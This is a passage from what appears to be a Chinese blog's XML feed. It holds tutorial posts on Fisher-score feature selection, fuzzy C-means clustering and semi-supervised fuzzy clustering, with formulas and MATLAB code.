class="hljs-built_in">j</span>});<span class="hljs-keyword">end</span><span class="hljs-comment">% calculate score for each features</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:numF<span class="hljs-comment">%</span>    temp1 = <span class="hljs-number">0</span>;    temp2 = <span class="hljs-number">0</span>;    f_i = X(:,<span class="hljs-built_in">i</span>);    u_i = <span class="hljs-built_in">mean</span>(f_i);<span class="hljs-comment">%每一个特征的均值</span>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:numC<span class="hljs-comment">%类别数numC</span>        u_cj = <span class="hljs-built_in">mean</span>(f_i(cIDX{<span class="hljs-built_in">j</span>}));        var_cj = var(f_i(cIDX{<span class="hljs-built_in">j</span>}),<span class="hljs-number">1</span>);        temp1 = temp1 + n_i(<span class="hljs-built_in">j</span>) * (u_cj-u_i)^<span class="hljs-number">2</span>;        temp2 = temp2 + n_i(<span class="hljs-built_in">j</span>) * var_cj;    <span class="hljs-keyword">end</span>    <span class="hljs-comment">%     if temp1 == 0</span><span class="hljs-comment">%         out.W(i) = 0;</span><span class="hljs-comment">%     else</span>        <span class="hljs-keyword">if</span> temp2 == <span class="hljs-number">0</span>            W(<span class="hljs-built_in">i</span>) = <span class="hljs-number">1000000</span>;<span class="hljs-comment">%分母为0，应为正无穷，用一个很大的数代替</span>        <span class="hljs-keyword">else</span>            W(<span class="hljs-built_in">i</span>) = temp1/temp2;        <span class="hljs-keyword">end</span><span class="hljs-comment">%     end</span><span class="hljs-keyword">end</span>[~, List] = <span class="hljs-built_in">sort</span>(W, <span class="hljs-string">'descend'</span>);<span class="hljs-comment">%各个特征的排序</span>redu=List(<span class="hljs-number">1</span>:m);<span class="hljs-comment">% redu=[];</span><span class="hljs-comment">% for i=1:m</span><span class="hljs-comment">%     redu=[redu find(List==i)];</span><span class="hljs-comment">% end</span><span class="hljs-keyword">end</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%clear;clc;close all</span>load iris.dat<span class="hljs-comment">%导入数据</span>[redu,FS,List] = fsFisher(iris(:,<span class="hljs-number">1</span>:<span class="hljs-number">4</span>),iris(:,<span class="hljs-number">5</span>),<span class="hljs-number">0.6</span>)</code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/jliang3/article/details/88912464" target="_blank" rel="noopener">特征选择/筛选方法总结</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 特征工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半监督模糊聚类(SFCM)</title>
      <link href="/2020/11/02/%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%A8%A1%E7%B3%8A%E8%81%9A%E7%B1%BB-SFCM/"/>
      <url>/2020/11/02/%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%A8%A1%E7%B3%8A%E8%81%9A%E7%B1%BB-SFCM/</url>
      
        <content type="html"><![CDATA[<p>经典半监督模糊聚类SFCM</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>在上一篇中已经介绍过<a href="https://www.studydrive.club/2020/11/02/mo-hu-c-jun-zhi-ju-lei-fcm/" target="_blank" rel="noopener">模糊C均值聚类</a>了，模糊C均值聚类是一种<strong>无监督学习</strong>方法，其无法利用标签信息，在这里将介绍一种<strong>有监督学习</strong>的模糊聚类算法——经典的半监督模糊聚类SFCM。</p><h2 id="FCM"><a href="#FCM" class="headerlink" title="FCM"></a>FCM</h2><p>先来复习一下FCM的目标函数：<br>$$<br>J_{fcm}(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2<br>$$</p><p>$$<br>s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1<br>$$</p><h2 id="SFCM"><a href="#SFCM" class="headerlink" title="SFCM"></a>SFCM</h2><p>再看SFCM的目标函数：<br>$$<br>J_{sfcm}(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2 + \alpha \sum_{i=1}^c \sum_{j=1}^n (u_{ij} - \widetilde{u}_{ij})^m ||x_j - v_i||^2<br>$$</p><p>$$<br>s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1<br>$$</p><p>仔细看一下的话就会发现SFCM的目标函数相比FCM增加了</p><p>$$\alpha \sum_{i=1}^c \sum_{j=1}^n (u_{ij} - \widetilde{u}_{ij})^m ||x_j - v_i||^2$$</p><p>这一项，再看一下增加的这一项是不是跟FCM也很像? 对，就在隶属度矩阵$u_{ij}$后面减去一个$\widetilde{u}_{ij}$（注意区分符号上面有无波浪线），以及在该项前面增加一个正则化项系数$\alpha$（这参数的值是自己设定的）。</p><p>这里来解释一下先验隶属度矩阵$ \widetilde{u}<em>{ij} $，先验隶属度矩阵$\widetilde{u}</em>{ij}$的大小与隶属度矩阵$u_{ij}$相同，与$u_{ij}$一样都是​c行​n列。( i={1,2…c}; j={1,2…n} )</p><p>假设某个数据集有5个样本，分为3类，即$n=5,c=3$。假设只给定前面三个样本标签，且前面三个样本分别属于第一类、第二类、第三类，第四第五个样本的标签信息未知（即没有给定标签），则其$\widetilde{u}<em>{ij}$为：<br>$$<br>\left[ \begin{matrix} 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0\ 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 \ 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \end{matrix} \right]<br>$$<br>即样本第i个样本属于第几类，就在第几行写为1，其余的元素全为0。由于需要求目标函数值最小的极小值点，在没有给定样本的隶属度一定的i情况下，SFCM的隶属度矩阵$u</em>{ij}$与给定的先验信息$\widetilde{u}_{ij}$越接近则目标函数值越小（其他标签未知样本的隶属度固定的情况下）。</p><p>再来看迭代式，仍然是用拉格朗日乘数法推导得到，在这里设定$m=2$,得到：</p><p>$$<br>u_{ij} = \frac{1}{1+a} [ \frac{1+\alpha(1-\sum_{i=1}^c \widetilde{u}<em>{ij} ) }{ \sum</em>{i=1}^c \frac{||x_j-v_i||^2 }{ ||x_j-v_k||^2 } } +\alpha \widetilde{u}_{ij} ]<br>$$</p><p>$$<br>v_i = \frac{\sum_{j=1}^n u_{ij}^2 x_j }{ \sum_{j=1}^n u_{ij}^2 }<br>$$</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[U,center]</span> = <span class="hljs-title">SFCMclust</span><span class="hljs-params">(data, cluster_n,data_label)</span></span>data_n = <span class="hljs-built_in">size</span>(data, <span class="hljs-number">1</span>); <span class="hljs-comment">% 求出data的第一维(rows)数,即样本个数</span>in_n = <span class="hljs-built_in">size</span>(data, <span class="hljs-number">2</span>);   <span class="hljs-comment">% 求出data的第二维(columns)数，即特征值长度</span><span class="hljs-comment">% 默认操作参数</span>options = [<span class="hljs-number">2</span>; <span class="hljs-comment">% 隶属度矩阵U的指数</span>   <span class="hljs-number">100</span>;                 <span class="hljs-comment">% 最大迭代次数</span>   <span class="hljs-number">1e-5</span>;               <span class="hljs-comment">% 隶属度最小变化量,迭代终止条件</span>   <span class="hljs-number">1</span>];                 <span class="hljs-comment">% 每次迭代是否输出信息标志</span><span class="hljs-comment">%将options 中的分量分别赋值给四个变量;</span>expo = options(<span class="hljs-number">1</span>);          <span class="hljs-comment">% 隶属度矩阵U的指数</span>max_iter = options(<span class="hljs-number">2</span>);  <span class="hljs-comment">% 最大迭代次数</span>min_impro = options(<span class="hljs-number">3</span>);  <span class="hljs-comment">% 隶属度最小变化量,迭代终止条件</span>display = options(<span class="hljs-number">4</span>);  <span class="hljs-comment">% 每次迭代是否输出信息标志</span>obj_fcn = <span class="hljs-built_in">zeros</span>(max_iter, <span class="hljs-number">1</span>); <span class="hljs-comment">% 初始化输出参数obj_fcn</span><span class="hljs-comment">%初始化F</span>[~,F] = initcenter(data_label,data,cluster_n);<span class="hljs-comment">%初始化center(随机选取样本作为初始聚类中心)</span>rn = randperm(<span class="hljs-built_in">size</span>(F,<span class="hljs-number">2</span>));rn = rn(<span class="hljs-number">1</span>:cluster_n);center0 = data(rn,:);<span class="hljs-comment">% 初始化模糊分配矩阵,使U满足列上相加为1,cluster_n=2,用户填上去的种类数c=cluster_n</span>a=<span class="hljs-number">5</span>;<span class="hljs-comment">%5比6好</span><span class="hljs-comment">% 随机初始化隶属度矩阵</span>U = <span class="hljs-built_in">rand</span>(<span class="hljs-built_in">size</span>(F));U = U./sum(U);<span class="hljs-comment">% Main loop  主要循环</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:max_iter   <span class="hljs-keyword">if</span> <span class="hljs-built_in">i</span>==<span class="hljs-number">1</span>       dist = distfcm(center0, data);        mf = U.^expo;        obj_fcn(<span class="hljs-number">1</span>)=sum(sum((dist.^<span class="hljs-number">2</span>).*mf))+a*sum(sum((dist.^<span class="hljs-number">2</span>).*((U-F).^expo)));   <span class="hljs-comment">%在第k步循环中改变聚类中心ceneter,和分配函数U的隶属度值;</span>   <span class="hljs-keyword">else</span>       [U, center, obj_fcn(<span class="hljs-built_in">i</span>)] = stepfcm(data, U, cluster_n, expo,a,F);   <span class="hljs-keyword">end</span>   <span class="hljs-keyword">if</span> display      fprintf(<span class="hljs-string">'SFCM:Iteration count = %d, obj. fcn = %f\n'</span>, <span class="hljs-built_in">i</span>, obj_fcn(<span class="hljs-built_in">i</span>));   <span class="hljs-keyword">end</span><span class="hljs-comment">% 终止条件判别</span>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">i</span>&gt;<span class="hljs-number">1</span>     <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(obj_fcn(<span class="hljs-built_in">i</span>) - obj_fcn(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)) &lt; min_impro           <span class="hljs-keyword">break</span>;     <span class="hljs-keyword">end</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-comment">%iter_n = i; % 实际迭代次数</span><span class="hljs-comment">%obj_fcn(iter_n+1:max_iter) = [];</span><span class="hljs-comment">%[~,j]=find(U&lt;0);</span><span class="hljs-comment">%U(:,j)=[];</span><span class="hljs-comment">%[V_pc,~,V_pe,V_xb] = V_pcpexb(U,data,center)</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[center,F]</span> = <span class="hljs-title">initcenter</span><span class="hljs-params">(data_label,data,cluster_n)</span>%默认为分3类</span>center=<span class="hljs-built_in">zeros</span>(cluster_n,<span class="hljs-built_in">size</span>(data, <span class="hljs-number">2</span>));<span class="hljs-comment">%可能要改</span>F=<span class="hljs-built_in">zeros</span>(cluster_n,<span class="hljs-built_in">size</span>(data, <span class="hljs-number">1</span>));<span class="hljs-comment">%可能要改</span><span class="hljs-keyword">for</span> k=<span class="hljs-number">1</span>:cluster_n <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(data_label,<span class="hljs-number">1</span>)<span class="hljs-comment">%center第一行，第一类</span>   <span class="hljs-keyword">if</span> data_label(<span class="hljs-built_in">i</span>,<span class="hljs-number">1</span>)==k       F(k,<span class="hljs-built_in">i</span>)=<span class="hljs-number">1</span>;       <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">2</span>:<span class="hljs-built_in">size</span>(data_label,<span class="hljs-number">2</span>)<span class="hljs-number">-1</span>          center(k,<span class="hljs-built_in">j</span>)=(data_label(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)+center(k,<span class="hljs-built_in">j</span>))/<span class="hljs-built_in">i</span>;       <span class="hljs-keyword">end</span>   <span class="hljs-keyword">end</span> <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-comment">% for i=1:size(data_label,1)%center第2行，第2类</span><span class="hljs-comment">%     if data_label(i,1)==2</span><span class="hljs-comment">%         F(2,i)=1;</span><span class="hljs-comment">%         for j=2:size(data_label,2)-1</span><span class="hljs-comment">%            center(2,j)=(data_label(i,j)+center(2,j))/i;</span><span class="hljs-comment">%         end</span><span class="hljs-comment">%     end</span><span class="hljs-comment">% end</span><span class="hljs-comment">%    </span><span class="hljs-comment">% for i=1:size(data_label,1)%center第3行，第3类</span><span class="hljs-comment">%     if data_label(i,1)==3</span><span class="hljs-comment">%         F(3,i)=1;</span><span class="hljs-comment">%         for j=2:size(data_label,2)-1</span><span class="hljs-comment">%            center(3,j)=(data_label(i,j)+center(3,j))/i;</span><span class="hljs-comment">%         end</span><span class="hljs-comment">%     end</span><span class="hljs-comment">% end</span>  <span class="hljs-keyword">end</span><span class="hljs-comment">% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">U</span> = <span class="hljs-title">initfcm</span><span class="hljs-params">(cluster_n,data,center0,F,a,expo)</span>%<span class="hljs-title">a</span>=6</span><span class="hljs-comment">% 初始化fcm的隶属度函数矩阵</span><span class="hljs-comment">% 输入:</span><span class="hljs-comment">%   cluster_n   ---- 聚类中心个数</span><span class="hljs-comment">%   data_n      ---- 样本点数</span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   U           ---- 初始化的隶属度矩阵</span><span class="hljs-comment">% U = rand(cluster_n, data_n);</span><span class="hljs-comment">% col_sum = sum(U);                      </span><span class="hljs-comment">% U = U./col_sum(ones(cluster_n, 1), :);%归一化</span>dist = distfcm(center0, data); tmp = dist.^(<span class="hljs-number">-2</span>/(expo<span class="hljs-number">-1</span>)); <span class="hljs-comment">%U= tmp./(ones(cluster_n, 1)*sum(tmp));</span>U_fcm= tmp./(<span class="hljs-built_in">ones</span>(cluster_n, <span class="hljs-number">1</span>)*sum(tmp));U_3 =(a/(<span class="hljs-number">1</span>+a))* U_fcm.*(<span class="hljs-built_in">ones</span>(cluster_n,<span class="hljs-number">1</span>)*sum(F));U=U_fcm+(a/(<span class="hljs-number">1</span>+a))*F-U_3;<span class="hljs-keyword">end</span><span class="hljs-comment">% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[U_new, center, obj_fcn]</span> = <span class="hljs-title">stepfcm</span><span class="hljs-params">(data,U,cluster_n, expo,a,F)</span></span><span class="hljs-comment">% 模糊C均值聚类时迭代的一步</span><span class="hljs-comment">% 输入：</span><span class="hljs-comment">%   data        ---- nxm矩阵,表示n个样本,每个样本具有m的维特征值</span><span class="hljs-comment">%   U           ---- 隶属度矩阵</span><span class="hljs-comment">%   cluster_n   ---- 标量,表示聚合中心数目,即类别数</span><span class="hljs-comment">%   expo        ---- 隶属度矩阵U的指数                     </span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   U_new       ---- 迭代计算出的新的隶属度矩阵</span><span class="hljs-comment">%   center      ---- 迭代计算出的新的聚类中心</span><span class="hljs-comment">%   obj_fcn     ---- 目标函数值</span>mf = U.^expo;       <span class="hljs-comment">% 隶属度矩阵进行指数运算结果</span>center = mf*data./((<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(data, <span class="hljs-number">2</span>), <span class="hljs-number">1</span>)*sum(mf'))'); <span class="hljs-comment">% 新聚类中心(7)式</span>     <span class="hljs-comment">% 计算距离矩阵</span>dist = distfcm(center, data);tmp = dist.^(<span class="hljs-number">-2</span>/(expo<span class="hljs-number">-1</span>));    U_fcm= tmp./(<span class="hljs-built_in">ones</span>(cluster_n, <span class="hljs-number">1</span>)*sum(tmp));U_3 =(a/(<span class="hljs-number">1</span>+a))* U_fcm.*((<span class="hljs-built_in">ones</span>(cluster_n,<span class="hljs-number">1</span>)*sum(F)));U_new=U_fcm+(a/(<span class="hljs-number">1</span>+a))*F-U_3;obj_fcn =sum(sum((dist.^<span class="hljs-number">2</span>).*mf))+a*sum(sum((dist.^<span class="hljs-number">2</span>).*((U-F).^expo)));  <span class="hljs-comment">% 计算目标函数值 (4)式</span><span class="hljs-keyword">end</span><span class="hljs-comment">% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">out</span> = <span class="hljs-title">distfcm</span><span class="hljs-params">(center, data)</span></span><span class="hljs-comment">% 计算样本点距离聚类中心的距离</span><span class="hljs-comment">% 输入：</span><span class="hljs-comment">%   center     ---- 聚类中心</span><span class="hljs-comment">%   data       ---- 样本点</span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   out        ---- 距离</span>out = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(center, <span class="hljs-number">1</span>), <span class="hljs-built_in">size</span>(data, <span class="hljs-number">1</span>)); <span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(center, <span class="hljs-number">1</span>) <span class="hljs-comment">% 对每一个聚类中心</span>   <span class="hljs-comment">% 每一次循环求得所有样本点到一个聚类中心的距离</span>   out(k, :) = <span class="hljs-built_in">sqrt</span>(sum(((data-<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(data,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)*center(k,:)).^<span class="hljs-number">2</span>)',<span class="hljs-number">1</span>)); <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/weixin_42663919/article/details/89525967" target="_blank" rel="noopener">半监督模糊聚类算法FCM，SFCM，SSFCM理论和代码</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊聚类 </tag>
            
            <tag> 弱监督学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模糊C均值聚类(FCM)</title>
      <link href="/2020/11/02/%E6%A8%A1%E7%B3%8AC%E5%9D%87%E5%80%BC%E8%81%9A%E7%B1%BB(FCM)/"/>
      <url>/2020/11/02/%E6%A8%A1%E7%B3%8AC%E5%9D%87%E5%80%BC%E8%81%9A%E7%B1%BB(FCM)/</url>
      
        <content type="html"><![CDATA[<p>从kmeans到FCM(模糊C均值聚类)</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>模糊聚类又称为软聚类，相对于硬聚类这种非此即彼的分类，其用<strong>隶属度</strong>来表示每个样本属于每一类的程度。</p><p>模糊聚类中最为经典(古老)的是模糊C均值聚类（FCM），但在里哦了解FCM之前先了解一下kmeans吧。</p><h2 id="kmeans"><a href="#kmeans" class="headerlink" title="kmeans"></a>kmeans</h2><p>先来看看kmeans的具体过程,已有大佬写得很清晰明了了，我这里直接Ctrl CV$[1]$：</p><p> <img src="https://images2015.cnblogs.com/blog/1042406/201612/1042406-20161212135954464-1143551568.png" srcset="/img/loading.gif" lazyload="" alt="kmeans迭代过程"> </p><p>上图a表达了初始的数据集，假设类簇数（分类数）k=2。在图b中，我们随机选择了两个k类所对应的类别质心，即图中的红色质心和蓝色质心，然后分别求样本中所有点到这两个质心的距离，并标记每个样本的类别为和该样本距离最小的质心的类别，如图c所示，经过计算样本和红色质心和蓝色质心的距离，我们得到了所有样本点的第一轮迭代后的类别。此时我们对我们当前标记为红色和蓝色的点分别求其新的质心，如图4所示，新的红色质心和蓝色质心的位置已经发生了变动。图e和图f重复了我们在图c和图d的过程，即将所有点的类别标记为距离最近的质心的类别并求新的质心。最终我们得到的两个类别如图f。</p><p>当然在实际K-Mean算法中，我们一般会多次运行图c和图d，才能达到最终的比较优的类别。这个循环多次执行图c和d的过程称之为“迭代”。</p><p>图和文字讲完了，现在来看看数学公式。</p><p>kmeans的思想是让每个聚类中心到属于该类的距离之和<strong>最小</strong>，故这样设置kmeans的目标函数：<br>$$<br>J = \sum_{i=1}^k \sum_{j=1}^n ||x_j-v_i||^2<br>$$<br>因为想要让每个聚类中心到属于该类的距离之和<strong>最小</strong>，即让<strong>目标函数值最小</strong>。</p><p>其中$k$为类簇数，$n$为样本数；$x_j$表示第$ j $个样本( $j$的范围是 $[1,n]$ )，$v_i$表示第$i$个聚类中心（因为类簇数是$k$，所以$i$的范围是 $[1,k]$ ）</p><p>注意，在上式中$x_j$和$v_i$都是一个向量。这里以经典聚类数据集<strong>iris</strong> (150个样本，每个样本4个特征，所有样本分为3类) 为例子说明：</p><p><strong>iris前五个样本</strong>（每一行表示一个样本的数据，这里每个样本4个特征）</p><table><thead><tr><th>5.1</th><th>3.5</th><th>1.4</th><th>0.2</th></tr></thead><tbody><tr><td>4.9</td><td>3</td><td>1.4</td><td>0.2</td></tr><tr><td>4.7</td><td>3.2</td><td>1.3</td><td>0.2</td></tr><tr><td>4.6</td><td>3.1</td><td>1.5</td><td>0.2</td></tr><tr><td>5</td><td>3.6</td><td>1.4</td><td>0.2</td></tr></tbody></table><p>$x_1$表示第1个样本，例如iris数据集中$x_1= [5.1 , 3.5 , 1.4 ,0.2 ] $</p><p>$v_1$表第一个聚类中心（类簇中心），因为样本是四个特征，所有类簇中心也是4个特征，4个数值分别是第一类样本的各个特征的均值。</p><h2 id="FCM"><a href="#FCM" class="headerlink" title="FCM"></a>FCM</h2><p>在kmeans中，聚类中心$ v_i $确定之后就确定样本所属类别了，属于其他类别的程度为 <strong>0</strong>。在模糊聚类中，增加了一个<strong>隶属度</strong>来表示各个样本属于每一类的<strong>程度</strong>。</p><p>在模糊聚类中通常用$u_{ij}$来表示<strong>隶属度矩阵</strong>，其中$i={1,..c }$，$j= { 1,2,…n }$；$c$为类簇数，$n$为样本数。（跟上面介绍kmeans的符号是一样的）</p><p>模糊C均值聚类的目标函数：<br>$$<br>J(U,V) = \sum_{i=1}^c \sum_{j=1}^n u_{ij}^m ||x_j-v_i||^2<br>$$</p><p>$$<br>s.t. \quad u_{ij} \in [0,1]; \sum_{i=1}^c u_{ij}=1<br>$$</p><p>其中$c$是类簇数（C均值聚类嘛，所以相比kmeans把k换成了c）。$m$是加权指数幂，是一个自己给定的大于2的参数。</p><p>目标函数的约束条件是<strong>隶属度</strong>的范围是0~1，每个样本的隶属度之和为1。</p><p>上述目标函数只有$ u_{ij} $和$v_i $是未知，其他都为已知。</p><p>为了因为有等式约束条件，所以FCM中用拉格朗日乘数法引入拉格朗日因子让目标函数满足隶属度约束条件，具体方法不在这里讲解[2]。</p><p>得到隶属度矩阵迭代式：<br>$$<br>u_{ij} = \frac{1}{\sum_{k=1}^c \frac{||x_j-v_i||}{||x_j-v_k||}^ \frac{1}{m-1} }<br>$$<br>聚类中心迭代式：<br>$$<br>v_i = \frac{\sum_{j=1}^n u_{ij}^m x_j }{ \sum_{j=1}^n{u_{ij}^m}}<br>$$</p><ul><li><p><strong>随机初始聚类中心/隶属度矩阵:</strong>从上面的隶属度矩阵和聚类中心迭代式可看出，隶属度矩阵迭代式里的未知只有$v_i$，而聚类中心跌打式里不知道的只有$u_{ij}$。故迭代前先随机给定一个符合条件的隶属度矩阵或聚类中心矩阵，然后即可开始迭代。</p><p>如果初始化给定的是<strong>聚类中心矩阵</strong>，那么将聚类中心矩阵代入<strong>隶属度矩阵迭代式</strong>中计算得到新的隶属度矩阵；否则将初始化给定的<strong>隶属度矩阵</strong>代入<strong>聚类中心迭代式</strong>中计算。</p></li><li><p><strong>迭代</strong>：将聚类中心$v_i$（隶属度矩阵$u_{ij}$）代入隶属度矩阵迭代式（聚类中心迭代式）中计算得到新的隶属度矩阵$u_{ij}$（聚类中心矩阵$v_{i}$），再将新的隶属度矩阵$u_{ij}$和聚类中心$v_i$代入目标函数计算一次目标函数值，完成一次迭代。</p></li><li><p><strong>迭代停止:</strong>当两次迭代的目标函数值变化不大（至于多少才算是不大，这个由自己根据情况设定，在此称为<strong>阈值</strong>）或达到预先设定的最大迭代次数，即停止迭代。此时隶属度矩阵$U$和聚类中心矩阵$V$即为聚类结果。（$U=u_{ij},V=v_i$）</p></li></ul><p>没了，下次再写点半监督模糊聚类吧~</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>在matlab中调用自带的FCM</p><div class="hljs code-wrapper"><pre><code class="hljs matlab">[center,U] = fcm(data, cluster_n)<span class="hljs-comment">% data为样本数据(样本数=数组行数)，cluster_n为类簇数</span></code></pre></div><p>FCM的详细实现：</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[U,center]</span> = <span class="hljs-title">FCMclust</span><span class="hljs-params">(data, cluster_n)</span></span><span class="hljs-comment">%% 随机初始隶属度FCM（这个比较符合算法实际情况）</span>data_n = <span class="hljs-built_in">size</span>(data, <span class="hljs-number">1</span>); <span class="hljs-comment">% 求出data的第一维(rows)数,即样本个数 [center, U, obj_fcn]= FCMClust(data, cluster_n)</span>in_n = <span class="hljs-built_in">size</span>(data, <span class="hljs-number">2</span>);   <span class="hljs-comment">% 求出data的第二维(columns)数，即特征值长度</span><span class="hljs-comment">% 默认操作参数</span>options = [<span class="hljs-number">2</span>; <span class="hljs-comment">% 隶属度矩阵U的指数</span>    <span class="hljs-number">100</span>;                <span class="hljs-comment">% 最大迭代次数</span>    <span class="hljs-number">1e-5</span>;               <span class="hljs-comment">% 隶属度最小变化量,迭代终止条件</span>    <span class="hljs-number">1</span>];                 <span class="hljs-comment">% 每次迭代是否输出信息标志</span>  <span class="hljs-comment">%将options 中的分量分别赋值给四个变量;</span>expo = options(<span class="hljs-number">1</span>);          <span class="hljs-comment">% 隶属度矩阵U的指数</span>max_iter = options(<span class="hljs-number">2</span>);  <span class="hljs-comment">% 最大迭代次数</span>min_impro = options(<span class="hljs-number">3</span>);  <span class="hljs-comment">% 隶属度最小变化量,迭代终止条件</span>display = options(<span class="hljs-number">4</span>);  <span class="hljs-comment">% 每次迭代是否输出信息标志</span> obj_fcn = <span class="hljs-built_in">zeros</span>(max_iter, <span class="hljs-number">1</span>); <span class="hljs-comment">% 初始化输出参数obj_fcn</span> <span class="hljs-comment">% U = initfcm(cluster_n, data_n);     % 初始化模糊分配矩阵,使U满足列上相加为1,cluster_n=2,用户填上去的种类数c=cluster_n</span>temp=randperm(<span class="hljs-built_in">size</span>(data,<span class="hljs-number">1</span>));center = data(temp(<span class="hljs-number">1</span>:cluster_n),:);dist = distfcm(center, data).^<span class="hljs-number">2</span>;tmp = dist.^(<span class="hljs-number">-2</span>/(expo<span class="hljs-number">-1</span>));    U = tmp./(<span class="hljs-built_in">ones</span>(cluster_n, <span class="hljs-number">1</span>)*sum(tmp));  <span class="hljs-comment">%根据随机选取的样本作为初始聚类中心得到的初始隶属度矩阵</span>[a,b] = <span class="hljs-built_in">find</span>(<span class="hljs-built_in">isnan</span>(U));U(a,b) = <span class="hljs-number">0</span>;<span class="hljs-comment">% U = rand(cluster_n,size(data,1)).*100;</span><span class="hljs-comment">% U = U./sum(U);</span><span class="hljs-comment">% Main loop  主要循环</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:max_iter    <span class="hljs-comment">%在第k步循环中改变聚类中心ceneter,和分配函数U的隶属度值;</span>    [U, center, obj_fcn(<span class="hljs-built_in">i</span>)] = stepfcm(data, U, cluster_n, expo);    <span class="hljs-keyword">if</span> display       fprintf(<span class="hljs-string">'FCMclust:Iteration count = %d, obj. fcn = %f\n'</span>, <span class="hljs-built_in">i</span>, obj_fcn(<span class="hljs-built_in">i</span>));    <span class="hljs-keyword">end</span> <span class="hljs-comment">% 终止条件判别</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">i</span>&gt;<span class="hljs-number">1</span>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(obj_fcn(<span class="hljs-built_in">i</span>) - obj_fcn(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)) &lt; min_impro            <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">end</span>    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span> iter_n = <span class="hljs-built_in">i</span>; <span class="hljs-comment">% 实际迭代次数</span><span class="hljs-comment">%obj_fcn(iter_n+1:max_iter) = [];</span><span class="hljs-comment">%% 评价指标</span><span class="hljs-comment">%[V_pc,~,V_pe,V_xb] = V_pcpexb(U,data,center)</span><span class="hljs-keyword">end</span> <span class="hljs-comment">%% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">U</span> = <span class="hljs-title">initfcm</span><span class="hljs-params">(cluster_n, data_n)</span></span><span class="hljs-comment">% 初始化fcm的隶属度函数矩阵</span><span class="hljs-comment">% 输入:</span><span class="hljs-comment">%   cluster_n   ---- 聚类中心个数</span><span class="hljs-comment">%   data_n      ---- 样本点数</span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   U           ---- 初始化的隶属度矩阵</span>U = <span 